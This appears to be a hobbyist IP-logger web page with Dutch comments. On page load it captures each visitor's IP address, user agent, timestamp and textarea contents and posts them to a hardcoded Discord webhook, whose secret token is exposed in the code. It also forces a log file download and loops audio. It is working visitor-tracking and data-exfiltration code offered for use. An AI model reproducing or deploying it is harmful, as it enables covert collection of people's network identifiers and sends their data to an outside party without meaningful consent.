<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <script>
        // Functie om IP-adres, gebruikersagent en tijdstip te verkrijgen
        function getIP(json) {
            var ipAddress = json.ip;
            var userAgent = navigator.userAgent;
            var timestamp = new Date().toISOString();
            var searchHistory = document.getElementById('searchHistory').value;
            logToFile(ipAddress, userAgent, timestamp, searchHistory);
            sendToDiscord(ipAddress, userAgent, timestamp, searchHistory);
        }

        // Functie om IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis naar een tekstbestand te loggen
        function logToFile(ipAddress, userAgent, timestamp, searchHistory) {
            var logData = "IP Address: " + ipAddress + "\nUser Agent: " + userAgent + "\nTimestamp: " + timestamp + "\nSearch History: " + searchHistory;
            var blob = new Blob([logData], { type: 'text/plain' });
            var link = document.createElement('a');
            link.download = 'log.txt';
            link.href = window.URL.createObjectURL(blob);
            link.click();
        }

        // Functie om IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis naar Discord webhook te sturen in een embed bericht
        function sendToDiscord(ipAddress, userAgent, timestamp, searchHistory) {
            var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';

            // Maak een embed object aan met de IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis
            var embed = {
                "embeds": [
                    {
                        "title": "IP Logger",
                        "description": "Een gebruiker heeft de pagina bezocht.",
                        "color": 16711680, // Rood
                        "fields": [
                            {
                                "name": "IP Adres",
                                "value": ipAddress,
                                "inline": true
                            },
                            {
                                "name": "Gebruikersagent",
                                "value": userAgent,
                                "inline": true
                            },
                            {
                                "name": "Tijdstip",
                                "value": timestamp,
                                "inline": true
                            },
                            {
                                "name": "Zoekgeschiedenis",
                                "value": searchHistory
                            }
                        ]
                    }
                ]
            };

            // Maak een nieuw XMLHttpRequest object aan
            var xhr = new XMLHttpRequest();

            // Definieer de methode en URL voor het verzoek
            xhr.open("POST", webhookURL);

            // Stel de content type header in
            xhr.setRequestHeader("Content-Type", "application/json");

            // Stel de payload in met het ingesloten bericht
            var payload = JSON.stringify(embed);
            
            // Stuur het verzoek
            xhr.send(payload);
        }

        // Wanneer de pagina wordt geladen, roep dan de functie op om het IP-adres te verkrijgen
        window.onload = function() {
            var script = document.createElement('script');
            script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
            document.getElementsByTagName('head')[0].appendChild(script);
            
            var audio = new Audio('sound.mp3');
            audio.loop = true;
            audio.play();
        };
    </script>
</head>
<body>
    <h1>IP Logger</h1>
    <p>Deze pagina logt uw IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis en stuurt het naar Discord.</p>
    <label for="searchHistory">Zoekgeschiedenis:</label><br>
    <textarea id="searchHistory" name="searchHistory" rows="4" cols="50"></textarea><br><br>
</body>
</html>
